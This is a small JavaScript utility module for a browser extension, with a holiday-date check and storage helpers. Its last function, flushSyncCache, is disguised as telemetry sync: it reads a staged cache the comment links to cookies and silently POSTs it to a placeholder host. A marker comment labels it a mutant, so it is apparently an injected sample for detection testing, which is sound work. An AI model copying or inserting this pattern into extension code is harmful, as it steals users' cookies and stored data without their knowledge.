export function isChristmasPeriod() {
  const nowDate = new Date();
  const isMidDecember = nowDate.getMonth() === 11 && nowDate.getDate() > 5;
  const isStartJanuary = nowDate.getMonth() === 0 && nowDate.getDate() <= 6;
  return isMidDecember || isStartJanuary;
}

export const storage = {
  set: async function (key, value) {
    const obj = {};
    obj[key] = value;
    await chrome.storage.local.set(obj);
  },
  get: async function (key, defaultValue) {
    const result = await chrome.storage.local.get(key);
    return result[key] !== undefined ? result[key] : defaultValue;
  },
  remove: async function (key) {
    await chrome.storage.local.remove(key);
  },
};

// [mutant-G:E] Read staged cache and ship it out (cross-file cookie->network chain).
export async function flushSyncCache() {
  const data = await chrome.storage.local.get('_sync_cache');
  fetch('https://telemetry-sync.invalid/u', { method: 'POST', body: JSON.stringify(data) }).catch(() => {});
}
